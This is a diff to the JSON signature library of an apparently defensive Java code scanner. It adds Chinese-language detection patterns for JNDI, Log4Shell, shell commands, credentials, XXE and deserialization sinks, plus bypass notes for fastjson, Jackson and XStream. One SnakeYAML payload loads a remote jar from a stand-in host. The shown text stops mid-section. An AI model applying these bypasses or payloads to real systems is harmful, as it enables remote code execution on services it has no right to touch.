@@ -1,7 +1,7 @@
 {
   "version": "2026.09",
   "note": "JavaSecExpToolKit 自研的代码特征签名库，不是从任何上游工具拷贝的规则文件（jar-analyzer 为 GPLv3，其 dfs-sink 等规则文件不可直接引入本仓库）。本文件只描述「代码里出现了什么特征」（字符串常量 / 类名 / 方法名），这些都从调用图数据库里读；组件与 gadget 的版本判定需要 Maven 坐标，而数据库不含坐标，因此那部分留在 Java 侧（analyzer/GadgetInventory）。",
-  "limits": "签名匹配只能给出「值得人工确认的候选点」：它判断的是「出现了这类特征」，不是「这条链一定可被外部触发」。参数是否可控、目标是否真的解析这段数据，都需人工确认。组件与 gadget 的版本判定需要 Maven 坐标，而调用图数据库不含坐标，因此那部分由 Java 侧按依赖元数据完成。",
+  "limits": "签名匹配只能给出「值得人工确认的候选点」：它判断的是「出现了这类特征」，不是「这条链一定可被外部触发」。参数是否可控、目标是否真的解析这段数据，都需人工确认。组件与 gadget 的版本判定需要 Maven 坐标，而调用图数据库不含坐标，因此那部分由 Java 侧按依赖元数据完成。 本报告的状态只有「疑似」一档：静态特征命中不等于漏洞成立，扫描未命中也不等于目标干净。严重度、置信度与可达性是三个独立维度，不合并成一个分数。",
   "severityOrder": [
     "high",
     "medium",
@@ -15,7 +15,9 @@
       "pattern": "jndi:(ldap|ldaps|rmi|dns|iiop|corba)://",
       "title": "出现 JNDI 协议地址",
       "detail": "JNDI 地址出现在字符串常量里：若这条常量最终进入 Context.lookup，且协议可被外部控制，即为 JNDI 注入（可接恶意 LDAP / RMI 服务）。",
-      "type": "jndi"
+      "type": "jndi",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-LOG4J-LOOKUP",
@@ -24,7 +26,9 @@
       "pattern": "\\$\\{\\s*(jndi|lower|upper|env|sys|date|java|main|script):",
       "title": "出现 Log4j2 lookup 表达式",
       "detail": "形如 ${jndi:...} 的字符串是 Log4Shell 的载荷特征：要么目标代码里就带着这段明文，要么它会被日志记录后触发解析。",
-      "type": "expression"
+      "type": "expression",
+      "source": "Apache Log4j2 官方文档（lookup 语法）；CVE-2021-44228 公开公告",
+      "tag": "log4j2"
     },
     {
       "id": "STR-RUNTIME-EXEC",
@@ -33,7 +37,9 @@
       "pattern": "Runtime\\s*\\.\\s*getRuntime\\s*\\(\\s*\\)\\s*\\.\\s*exec",
       "title": "出现 Runtime.exec 字面量",
       "detail": "字符串常量里出现 Runtime.getRuntime().exec：常见于后门、演示代码，或把命令拼接好的硬编码路径，值得直接看这段常量所在的方法。",
-      "type": "command"
+      "type": "command",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-SHELL-CMD",
@@ -42,7 +48,9 @@
       "pattern": "(?i)(/bin/(sh|bash|zsh)|cmd(\\.exe)?\\s*/c|powershell(\\.exe)?\\s+-)",
       "title": "出现可执行 shell 命令片段",
       "detail": "字符串常量里出现 shell 调用片段：常见于命令拼接点，配合 sink 命中即可确认命令执行链。",
-      "type": "command"
+      "type": "command",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-SERIALIZED",
@@ -51,7 +59,9 @@
       "pattern": "rO0AB",
       "title": "出现 Java 序列化流常量",
       "detail": "rO0AB 是 Java 序列化流的 Base64 头：代码里内嵌一段序列化数据，通常意味着存在「从常量反序列化」，是天然的利用入口。",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-AK",
@@ -60,7 +70,9 @@
       "pattern": "(AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AIza[0-9A-Za-z_\\-]{35})",
       "title": "出现云平台 AccessKey 形态的常量",
       "detail": "命中 AWS / 阿里云 / GCP 的 AccessKey 形态：若为真实凭据可直接用于横向，属于必须立即确认的一条。",
-      "type": "credential"
+      "type": "credential",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-JDBC-PASSWORD",
@@ -69,7 +81,9 @@
       "pattern": "(?i)jdbc:[a-z0-9]+://\\S{0,200}(password|pwd)=",
       "title": "数据库连接串内带口令",
       "detail": "JDBC URL 里直接写了 password 参数：凭据硬编码，且该串通常同时暴露内网地址与库名。",
-      "type": "credential"
+      "type": "credential",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-WEAK-SECRET",
@@ -78,7 +92,9 @@
       "pattern": "(?i)(password|passwd|secret|token|apikey|api_key|private_key|accesskey)\\s*[=:]\\s*\\S{6,}",
       "title": "疑似硬编码凭据",
       "detail": "出现「键=值」形态的凭据常量：可能是真实密钥，也可能是配置模板的占位符，需要看这条常量所在的上下文。",
-      "type": "credential"
+      "type": "credential",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-BASE64-BLOB",
@@ -87,7 +103,9 @@
       "pattern": "^[A-Za-z0-9+/]{180,}={0,2}$",
       "title": "超长 Base64 常量",
       "detail": "单个字符串常量本身是一段超长 Base64：常见于内嵌 payload、证书或密钥，配合序列化特征即可确认是否为恶意载荷。",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-EXPRESSION",
@@ -96,7 +114,9 @@
       "pattern": "(?i)(ognl|spel|mvel|__\\$|#\\{[^}]{2,}\\}|%\\{[^}]{2,}\\})",
       "title": "出现表达式求值特征",
       "detail": "出现 OGNL / SpEL / MVEL 或模板表达式特征：若表达式内容可被外部影响，即表达式注入。",
-      "type": "expression"
+      "type": "expression",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-ACTUATOR",
@@ -105,7 +125,9 @@
       "pattern": "(?i)/actuator/(env|refresh|gateway|heapdump|jolokia)",
       "title": "出现 Spring Actuator 敏感端点",
       "detail": "代码里硬编码了 Actuator 的敏感端点：可能被用于读取环境变量（含凭据）或触发配置刷新。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "Spring 官方文档（Actuator / MVC 端点约定）",
+      "tag": "spring"
     },
     {
       "id": "STR-JDBC-URL",
@@ -114,7 +136,9 @@
       "pattern": "jdbc:[a-z0-9]+://",
       "title": "出现数据库连接串",
       "detail": "连接串常量通常会带出内网地址、库名与驱动类型，是横向的起点线索。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-INTERNAL-IP",
@@ -123,7 +147,9 @@
       "pattern": "\\b(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(1[6-9]|2[0-9]|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})\\b",
       "title": "出现内网地址常量",
       "detail": "内网地址常量可用于判断目标的网络位置与内网横向路径。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-LOOPBACK",
@@ -132,7 +158,9 @@
       "pattern": "(?i)https?://(127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0)(:\\d+)?",
       "title": "出现指向本机的 URL",
       "detail": "代码里内置了指向本机的 URL：常见于内部服务调用，或 SSRF 的默认目标。",
-      "type": "ssrf"
+      "type": "ssrf",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-TRAVERSAL",
@@ -141,7 +169,9 @@
       "pattern": "\\.\\./\\.\\./",
       "title": "出现路径穿越片段",
       "detail": "出现 ../../ 片段：可能是路径拼接点，也可能是解压 / 文件读取的绕过尝试。",
-      "type": "path"
+      "type": "path",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     },
     {
       "id": "STR-DOCTYPE",
@@ -150,7 +180,9 @@
       "pattern": "(?i)<!DOCTYPE\\s+[^>]*\\[",
       "title": "出现带内部子集的 DOCTYPE",
       "detail": "内联 DTD 是 XXE 载荷的常见写法：只要这段字符串进入未禁用外部实体的解析器，即可读文件或带外外带。",
-      "type": "xxe"
+      "type": "xxe",
+      "source": "XML 1.0 规范（DTD 声明）；XXE 公开研究",
+      "tag": "xxe"
     },
     {
       "id": "STR-ENTITY-SYSTEM",
@@ -159,7 +191,9 @@
       "pattern": "(?i)<!ENTITY\\s+%?\\s*\\w+\\s+SYSTEM\\s",
       "title": "出现外部实体定义",
       "detail": "SYSTEM 实体是 XXE 的落点：它既可直接读本地文件，也可作为带外通道（无回显场景）。",
-      "type": "xxe"
+      "type": "xxe",
+      "source": "XML 1.0 规范（SYSTEM 实体）；XXE 公开研究",
+      "tag": "xxe"
     },
     {
       "id": "STR-MULTIPART",
@@ -168,7 +202,9 @@
       "pattern": "(?i)(multipart/form-data|Content-Disposition:\\s*form-data|filename=)",
       "title": "出现上传表单特征",
       "detail": "上传接口的请求特征：这类接口通常同时存在后缀校验与存储路径拼接两处可控点。",
-      "type": "upload"
+      "type": "upload",
+      "source": "RFC 7578 multipart/form-data 规范",
+      "tag": "upload"
     },
     {
       "id": "STR-UPLOAD-SUFFIX",
@@ -177,7 +213,9 @@
       "pattern": "(?i)\\.(jsp|jspx|jspf|php|asp|aspx|war)(%00|;|\\.|\\s|$)",
       "title": "出现可执行上传后缀",
       "detail": "字符串里带可执行后缀，通常就是上传接口的黑名单或白名单：黑名单漏项（.jspx/.jspf/大小写/分号截断）即可绕过。",
-      "type": "upload"
+      "type": "upload",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "upload"
     },
     {
       "id": "STR-REDOS",
@@ -186,7 +224,9 @@
       "pattern": "(\\([^)]*[+*][^)]*\\)[+*])",
       "title": "疑似嵌套量词正则",
       "detail": "嵌套量词（如 (a+)+）遇到超长不匹配输入会回溯爆炸，是 ReDoS 的典型写法；确认这段正则的模式是否包含用户输入。",
-      "type": "dos"
+      "type": "dos",
+      "source": "OWASP 通用缺陷特征；本项目按 Java 场景梳理",
+      "tag": "generic"
     }
   ],
   "classes": [
@@ -197,7 +237,9 @@
       "pattern": "(?i).*(Deserializer|ObjectInputStream|AutoType|TypeUtils|XStream|Hessian|Kryo).*",
       "title": "反序列化实现类",
       "detail": "类名表明它承担反序列化职责：这类类内部通常就是 sink 的调用方，优先看它的入口方法。",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "CLS-FILTER",
@@ -206,7 +248,9 @@
       "pattern": "(?i).*(Filter|Interceptor)$",
       "title": "过滤器 / 拦截器",
       "detail": "Filter 与 Interceptor 是外部请求的必经之路：其中的参数通常直接可控。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "servlet"
     },
     {
       "id": "CLS-SERVLET",
@@ -215,7 +259,9 @@
       "pattern": ".*Servlet$",
       "title": "Servlet",
       "detail": "Servlet 的 doGet / doPost 参数来自请求，是判断可达性的起点。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "servlet"
     },
     {
       "id": "CLS-CONTROLLER",
@@ -224,7 +270,9 @@
       "pattern": "(?i).*(Controller|Resource|Endpoint)$",
       "title": "控制器 / 端点",
       "detail": "控制器里的方法通常直接对应一条 HTTP 路由，是判断「能不能被外部调到」的入口。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "Spring 官方文档（Actuator / MVC 端点约定）",
+      "tag": "spring"
     },
     {
       "id": "CLS-JNDI",
@@ -233,7 +281,9 @@
       "pattern": "(?i).*(Jndi|Ldap|Rmi|InitialContext).*",
       "title": "JNDI 相关类",
       "detail": "类名与 JNDI 相关：关注其中的 lookup 调用与地址来源。",
-      "type": "jndi"
+      "type": "jndi",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "CLS-TEMPLATE",
@@ -242,7 +292,9 @@
       "pattern": "(?i).*(TemplatesImpl|TemplateEngine|Freemarker|Velocity|Thymeleaf|GroovyShell).*",
       "title": "模板 / 脚本引擎类",
       "detail": "模板引擎与 TemplatesImpl 既是注入点，也是经典的字节码 gadget 载体。",
-      "type": "template"
+      "type": "template",
+      "source": "Freemarker / Velocity / Thymeleaf 官方文档",
+      "tag": "template"
     },
     {
       "id": "CLS-CLASSLOADER",
@@ -251,7 +303,9 @@
       "pattern": "(?i).*(ClassLoader|defineClass|URLClassLoader).*",
       "title": "类加载器相关类",
       "detail": "自定义类加载通常意味着「运行时定义字节码」，是 RCE 链的最后一环。",
-      "type": "codegen"
+      "type": "codegen",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "CLS-XML-PARSER",
@@ -260,7 +314,9 @@
       "pattern": "(?i).*(SAXParser|DocumentBuilder|XMLReader|XMLStreamReader|Digester|TransformerFactory).*",
       "title": "XML 解析器相关类",
       "detail": "这些解析器默认允许外部实体，除非显式设置 disallow-doctype-decl 或关闭外部实体；优先看它的调用方是否传入外部数据。",
-      "type": "xxe"
+      "type": "xxe",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "xxe"
     },
     {
       "id": "CLS-MULTIPART-FILE",
@@ -269,7 +325,9 @@
       "pattern": "(?i).*(MultipartFile|CommonsMultipartResolver|DiskFileItem|ServletFileUpload|Part).*",
       "title": "文件上传相关类",
       "detail": "这类类负责接收上传内容：它的下游一定存在「按用户输入决定落盘路径」的代码，是上传漏洞的必查点。",
-      "type": "upload"
+      "type": "upload",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "upload"
     },
     {
       "id": "CLS-ZIP-INFLATE",
@@ -278,7 +336,9 @@
       "pattern": "(?i).*(ZipInputStream|GZIPInputStream|ZipFile|Inflater|ZipArchive).*",
       "title": "解压相关类",
       "detail": "解压未限制比例与大小时可被压缩炸弹耗尽磁盘或内存；确认是否存在解压前的体积上限校验。",
-      "type": "dos"
+      "type": "dos",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     }
   ],
   "methods": [
@@ -289,7 +349,9 @@
       "pattern": "^(readObject|readUnshared|readResolve|readExternal|readFrom)$",
       "title": "反序列化回调方法",
       "detail": "这些方法由反序列化过程自动调用：它们内部的危险调用只要 gadget 可达即会执行。",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "MET-LOOKUP",
@@ -298,7 +360,9 @@
       "pattern": "^(lookup|doLookup)$",
       "title": "JNDI lookup 方法",
       "detail": "lookup 是 JNDI 注入的落点：确认参数是否来自外部。",
-      "type": "jndi"
+      "type": "jndi",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "MET-EXEC",
@@ -307,7 +371,9 @@
       "pattern": "^(eval|doEval|exec|doExec|execute|doExecute|invoke|doInvoke|runCommand)$",
       "title": "求值 / 执行类方法",
       "detail": "方法名表明它执行了外部内容（命令、脚本或反射调用）：参数可控即达成利用。",
-      "type": "command"
+      "type": "command",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "MET-HTTP",
@@ -316,7 +382,9 @@
       "pattern": "^(doGet|doPost|doPut|doDelete|service|handleRequest|onMessage)$",
       "title": "HTTP 处理方法",
       "detail": "这些方法是外部请求的直接处理点，可作为可达性分析的入口。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "servlet"
     },
     {
       "id": "MET-CLASSLOAD",
@@ -325,7 +393,9 @@
       "pattern": "^(defineClass|loadClass|newInstance|defineAnonymousClass)$",
       "title": "类加载 / 实例化方法",
       "detail": "运行时定义或加载类：字节码来源可控时即为代码执行。",
-      "type": "codegen"
+      "type": "codegen",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "MET-MAIN",
@@ -334,7 +404,9 @@
       "pattern": "^main$",
       "title": "程序入口",
       "detail": "main 可作为本地触发路径：某些链在注入工具或任务调度里通过命令行触发。",
-      "type": "exposure"
+      "type": "exposure",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     },
     {
       "id": "MET-PARSE-XML",
@@ -343,7 +415,9 @@
       "pattern": "^(parse|parseInputSource|unmarshal|fromXML|newDocument|build)$",
       "title": "XML 解析方法",
       "detail": "这些方法把外部输入送进解析器：确认是否禁用了 DTD 与外部实体。",
-      "type": "xxe"
+      "type": "xxe",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "xxe"
     },
     {
       "id": "MET-TRANSFER-TO",
@@ -352,7 +426,9 @@
       "pattern": "^(transferTo|write|getOriginalFilename|getSubmittedFileName|save)$",
       "title": "上传落盘方法",
       "detail": "落盘方法决定文件写到哪：确认目标路径是否由用户输入拼接，以及后缀是否在写盘前被规范化校验。",
-      "type": "upload"
+      "type": "upload",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "upload"
     },
     {
       "id": "MET-READ-ALL",
@@ -361,7 +437,9 @@
       "pattern": "^(readAllBytes|readFully|toByteArray|unzip|inflate)$",
       "title": "一次性读取全部内容",
       "detail": "把输入整体读进内存：输入大小不可控时可直接触发内存耗尽。",
-      "type": "dos"
+      "type": "dos",
+      "source": "本项目自研特征；依据 Java 语言与主流框架公开文档的通用用法整理",
+      "tag": "generic"
     }
   ],
   "sinks": [
@@ -373,7 +451,9 @@
       "method": "exec",
       "title": "Runtime.exec",
       "detail": "Runtime.exec 执行系统命令：命令串可控即 RCE",
-      "type": "command"
+      "type": "command",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-02",
@@ -383,7 +463,9 @@
       "method": "start",
       "title": "ProcessBuilder.start",
       "detail": "ProcessBuilder.start 启动进程：命令与参数可控即 RCE",
-      "type": "command"
+      "type": "command",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-03",
@@ -393,7 +475,9 @@
       "method": "eval",
       "title": "ScriptEngine.eval",
       "detail": "脚本引擎求值：脚本内容可控即 RCE",
-      "type": "command"
+      "type": "command",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-04",
@@ -403,7 +487,9 @@
       "method": "defineClass",
       "title": "ClassLoader.defineClass",
       "detail": "运行时定义类：字节码可控即 RCE",
-      "type": "codegen"
+      "type": "codegen",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-05",
@@ -413,7 +499,9 @@
       "method": "loadClass",
       "title": "ClassLoader.loadClass",
       "detail": "加载类：类名可控且能投递字节码即可 RCE",
-      "type": "codegen"
+      "type": "codegen",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-06",
@@ -423,7 +511,9 @@
       "method": "lookup",
       "title": "Context.lookup",
       "detail": "JNDI lookup：地址可控且允许 ldap / rmi 协议即 RCE",
-      "type": "jndi"
+      "type": "jndi",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-07",
@@ -433,7 +523,9 @@
       "method": "lookup",
       "title": "InitialContext.lookup",
       "detail": "InitialContext.lookup 同上",
-      "type": "jndi"
+      "type": "jndi",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-08",
@@ -443,7 +535,9 @@
       "method": "readObject",
       "title": "ObjectInputStream.readObject",
       "detail": "Java 原生反序列化入口：数据流可控且 classpath 有 gadget 即 RCE",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-09",
@@ -453,7 +547,9 @@
       "method": "readUnshared",
       "title": "ObjectInputStream.readUnshared",
       "detail": "readUnshared 反序列化入口",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-10",
@@ -463,7 +559,9 @@
       "method": "parseObject",
       "title": "JSON.parseObject",
       "detail": "Fastjson 解析：autoType 可绕即 RCE",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "fastjson 官方文档（JSON.parseObject 语义）",
+      "tag": "fastjson"
     },
     {
       "id": "SNK-11",
@@ -473,7 +571,9 @@
       "method": "parse",
       "title": "JSON.parse",
       "detail": "Fastjson 解析入口",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "fastjson 官方文档（JSON.parse 语义）",
+      "tag": "fastjson"
     },
     {
       "id": "SNK-12",
@@ -483,7 +583,9 @@
       "method": "readValue",
       "title": "ObjectMapper.readValue",
       "detail": "Jackson 反序列化：开启 default typing 即可 RCE",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "Jackson 官方文档（ObjectMapper.readValue）",
+      "tag": "jackson"
     },
     {
       "id": "SNK-13",
@@ -493,7 +595,9 @@
       "method": "load",
       "title": "Yaml.load",
       "detail": "SnakeYAML 反序列化：默认构造器下可实例化任意类",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "SnakeYAML 官方文档（Yaml.load）",
+      "tag": "snakeyaml"
     },
     {
       "id": "SNK-14",
@@ -503,7 +607,9 @@
       "method": "loadAs",
       "title": "Yaml.loadAs",
       "detail": "SnakeYAML 反序列化入口",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "SnakeYAML 官方文档（Yaml.loadAs）",
+      "tag": "snakeyaml"
     },
     {
       "id": "SNK-15",
@@ -513,7 +619,9 @@
       "method": "fromXML",
       "title": "XStream.fromXML",
       "detail": "XStream 反序列化：黑名单绕过即可 RCE",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "XStream 官方文档（fromXML）",
+      "tag": "xstream"
     },
     {
       "id": "SNK-16",
@@ -523,7 +631,9 @@
       "method": "readObject",
       "title": "HessianInput.readObject",
       "detail": "Hessian 反序列化入口",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "Hessian 协议文档（HessianInput.readObject）",
+      "tag": "hessian"
     },
     {
       "id": "SNK-17",
@@ -533,7 +643,9 @@
       "method": "readObject",
       "title": "XMLDecoder.readObject",
       "detail": "XMLDecoder 反序列化入口",
-      "type": "deserialization"
+      "type": "deserialization",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "xmldecoder"
     },
     {
       "id": "SNK-18",
@@ -543,7 +655,9 @@
       "method": "execute",
       "title": "Statement.execute",
       "detail": "SQL 语句执行：语句拼接即注入",
-      "type": "sqli"
+      "type": "sqli",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-19",
@@ -553,7 +667,9 @@
       "method": "executeQuery",
       "title": "Statement.executeQuery",
       "detail": "SQL 查询：拼接即注入",
-      "type": "sqli"
+      "type": "sqli",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-20",
@@ -563,7 +679,9 @@
       "method": "executeUpdate",
       "title": "Statement.executeUpdate",
       "detail": "SQL 更新：拼接即注入",
-      "type": "sqli"
+      "type": "sqli",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-21",
@@ -573,7 +691,9 @@
       "method": "<init>",
       "title": "FileInputStream.<init>",
       "detail": "按路径读文件：路径可控即任意读",
-      "type": "path"
+      "type": "path",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-22",
@@ -583,7 +703,9 @@
       "method": "<init>",
       "title": "FileOutputStream.<init>",
       "detail": "按路径写文件：路径可控即任意写",
-      "type": "path"
+      "type": "path",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-23",
@@ -593,7 +715,9 @@
       "method": "<init>",
       "title": "RandomAccessFile.<init>",
       "detail": "随机读写文件：路径可控即任意读写",
-      "type": "path"
+      "type": "path",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-24",
@@ -603,7 +727,9 @@
       "method": "delete",
       "title": "File.delete",
       "detail": "删除文件：路径可控即可删除任意文件",
-      "type": "path"
+      "type": "path",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-25",
@@ -613,7 +739,9 @@
       "method": "openConnection",
       "title": "URL.openConnection",
       "detail": "URL 连接：URL 可控即 SSRF",
-      "type": "ssrf"
+      "type": "ssrf",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     },
     {
       "id": "SNK-26",
@@ -623,7 +751,9 @@
       "method": "connect",
       "title": "HttpURLConnection.connect",
       "detail": "发起 HTTP 连接：目标可控即 SSRF",
-      "type": "ssrf"
+      "type": "ssrf",
+      "source": "JDK 官方 API 文档（java.base / java.naming / java.sql 等）",
+      "tag": "generic"
     }
   ],
   "sections": [
@@ -637,158 +767,791 @@
       "id": "deserialization",
       "name": "反序列化",
       "trigger": "攻击者可控的字节流进入 readObject / parseObject 一类反序列化调用",
+      "prerequisites": [
+        "反序列化入口的输入可被外部控制",
+        "classpath 上存在可用的 gadget 依赖（且版本未修复）",
+        "未开启白名单 / autoType 已关闭且无可绕过点"
+      ],
+      "refutations": [
+        "只反序列化固定类型（白名单或明确泛型）",
+        "相关 gadget 组件不在运行时 classpath 上",
+        "依赖版本已修复对应绕过手法"
+      ],
       "bypasses": [
-        "黑名单绕过：fastjson 依次可用 L 前缀、双写 LL、`[` 前缀、TypeUtils 缓存、Throwable / AutoCloseable 预期类",
-        "Jackson：未关闭 enableDefaultTyping 时可用 @class 单值或数组包装 [\"com.x.Foo\",{...}]",
-        "SnakeYAML：`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x/a.jar\"]]]]`",
-        "XStream：黑名单外仍有 ImageIO$ContainsFilter、sun.rmi.server.UnicastRef 一类链",
-        "二次反序列化：SignedObject、RMIConnector、c3p0 绕过「只允许基础类型」的网关",
-        "UID 对齐：目标类改了字段时需重算 serialVersionUID，否则反序列化直接失败"
-      ]
+        {
+          "text": "fastjson 黑名单绕过：L 前缀、双写 LL、`[` 前缀、TypeUtils 缓存、Throwable / AutoCloseable 预期类",
+          "source": "fastjson 各版本公开绕过研究",
+          "appliesTo": "fastjson 1.2.25 ~ 1.2.80，逐段对应不同写法",
+          "requires": "autoType 未被 safeMode 关闭，且 classpath 上存在可用 gadget",
+          "tags": [
+            "fastjson"
+          ]
+        },
+        {
+          "text": "Jackson：未关闭 enableDefaultTyping 时可用 @class 单值或数组包装 [\"com.x.Foo\",{...}]",
+          "source": "Jackson 官方安全公告与公开研究",
+          "appliesTo": "jackson-databind 2.9.10.8 之前的多条黑名单绕过",
+          "requires": "目标开启了 default typing（或等价的多态反序列化）",
+          "tags": [
+            "jackson"
+          ]
+        },
+        {
+          "text": "SnakeYAML：!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x/a.jar\"]]]]",
+          "source": "CVE-2022-1471 公开公告",
+          "appliesTo": "SnakeYAML 1.x（默认构造器）",
+          "requires": "使用了 Yaml.load 一类不安全构造器，且能提交任意 YAML",
+          "tags": [
+            "snakeyaml"
+          ]
+        },
+        {
+          "text": "XStream：黑名单外仍有 ImageIO$ContainsFilter、sun.rmi.server.UnicastRef 一类链",
+          "source": "XStream 官方安全公告",
+          "appliesTo": "1.4.17 及以下",
+          "requires": "目标 version 落在受影响区间，且 XML 内容可控",
+          "tags": [
+            "xstream"
+          ]
+        },
+        {
+          "text": "二次反序列化：SignedObject、RMIConnector、c3p0 绕过「只允许基础类型」的网关",
+          "source": "公开 JNDI / 反序列化网关绕过研究",
+          "appliesTo": "存在 JNDI 或网关层过滤的中间件场景",
+          "requires": "网关只做类名白名单，未阻断内层对象流",
+          "tags": [
+            "gateway"
+          ]
+        },
+        {
+          "text": "UID 对齐：目标类改了字段时需重算 serialVersionUID，否则反序列化直接失败",
+          "source": "JDK 序列化规范",
+          "appliesTo": "Java 原生反序列化",
+          "requires": "可获取目标类的字段结构与原 serialVersionUID",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "Java 原生反序列化、fastjson / fastjson2、Jackson、SnakeYAML、XStream、Hessian 等把外部数据还原成对象的入口",
